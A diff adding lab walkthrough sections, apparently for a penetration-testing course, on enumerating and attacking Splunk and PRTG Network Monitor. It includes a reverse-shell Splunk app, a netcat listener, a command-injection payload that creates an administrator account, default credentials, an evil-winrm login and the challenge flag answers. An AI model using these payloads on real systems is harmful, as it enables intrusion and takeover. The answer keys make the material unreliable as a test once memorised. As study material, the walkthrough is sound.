@@ -16,6 +16,10 @@
     2. [Attacking Tomcat](#attacking-tomcat)
     3. [Jenkins - Discovery & Enumeration](#jenkins---discovery--enumeration)
     4. [Attacking Jenkins](#attacking-jenkins)
+4. [Infrastructure/Network Monitoring Tools](#infrastructurenetwork-monitoring-tools-1)
+    1. [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration)
+    2. [Attacking Splunk](#attacking-splunk)
+    3. [PRTG Network Monitor](#prtg-network-monitor)
 
 ## Tools
 ### Application Discovery & Enumeration
@@ -32,6 +36,9 @@
 - [drupalgeddon.py](https://www.exploit-db.com/exploits/34992)
 ### Servlet Containers/Software Development
 - [cmd.jsp](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)
+### Infrastructure/Network Monitoring Tools
+- [reverse_shell_splunk](https://github.com/0xjpuff/reverse_shell_splunk.git)
+- evil-winrm
 
 ## Setting the Stage
 ### Application Discovery & Enumeration
@@ -383,3 +390,74 @@
     println sout
     ```
     The answer is `f33ling_gr00000vy!`.
+
+## Infrastructure/Network Monitoring Tools
+### Splunk - Discovery & Enumeration
+#### Challenges
+1. Enumerate the Splunk instance as an unauthenticated user. Submit the version number to move on (format 1.2.3).
+
+    First, we can do enumeration by using nmap.
+
+    ```bash
+    sudo nmap -sV 10.129.91.145
+    ```
+    ![alt text](<Assets/Splunk - Discovery & Enumeration - 1.png>)
+
+    Based on that, splunk is running in the port 8000 and 8089. We can try to visit port 8000.
+
+    ![alt text](<Assets/Splunk - Discovery & Enumeration - 2.png>)
+
+    We can see the splunk version in the tab. The answer is `8.2.2`.
+
+### Attacking Splunk
+#### Challenges
+1. Attack the Splunk target and gain remote code execution. Submit the contents of the flag.txt file in the c:\loot directory.
+
+    We can use this [repository](https://github.com/0xjpuff/reverse_shell_splunk.git) to gain reverse shell. This repository contain several files.
+
+    - bin/run.ps1   : This is the main script to gain reverse shell in windows target host.
+    - bin/run.bat   : This file will run when the application is deployed and execute the PowerShell one-liner
+    - bin/rev.py    : This is the main script to gain reverse shell in linux target host.
+    - default/inputs.conf : This file will tell Splunk to execute which file and the condition.
+
+    Because we the target host is windows, based on the nmap output, we need to edit `/bin/run.ps1` to change the IP address and port. Then, we can create a tarball.
+
+    ```bash
+    tar -cvzf updater.tar.gz reverse_shell_splunk
+    ```
+    Then, we can upload the file in the **https://10.129.91.145:8000/en-US/manager/search/apps/local** endpoint. But before we upload the tarball, we need to prepare the listener on our host.
+
+    ```bash
+    sudo nc -lnvp 443
+    ```
+    ![alt text](<Assets/Attacking Splunk - 1.png>)
+
+    The answer is `l00k_ma_no_AutH!`.
+
+### PRTG Network Monitor
+#### Challenges
+1. What version of PRTG is running on the target?
+
+    In the [Splunk - Discovery & Enumeration](#splunk---discovery--enumeration) we had run nmap to enumerate the target host. We can see that PRTG version is `18.1.37.13946`.
+
+2. Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop.
+
+    PRTG 18.1.37.13946 has Command Injection Vulnerability. When we add notification, in the parameter of execute program section, the parameter field will be passed to the powershell without sanitazion and executed it with SYSTEM level. We can use this vuln to add user and grant them Administrator role. So to do this, we need to login to the PRTG page (http://10.129.91.145:8080). We can use the same credential like in the module, `prtgadmin:Password123`. Once we have logged in, we can go to setup -> Account Settings -> Notifications -> Add Notification. Then, we can fill the field like this:
+
+    ![alt text](<Assets/PRTG Network Monitor - 1.png>)
+
+    ![alt text](<Assets/PRTG Network Monitor - 2.png>)
+
+    We used this payload in the parameter section.
+
+    ```txt
+    test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
+    ```
+    After that, click save and run notification test. Then, we can test to login by using `evil-winrm`.
+
+    ```bash
+    evil-winrm -i 10.129.91.145 -u prtgadm1 -p 'Pwn3d_by_PRTG!'
+    ```
+    ![alt text](<Assets/PRTG Network Monitor - 3.png>)
+
+    The answer is `WhOs3_m0nit0ring_wH0?`.
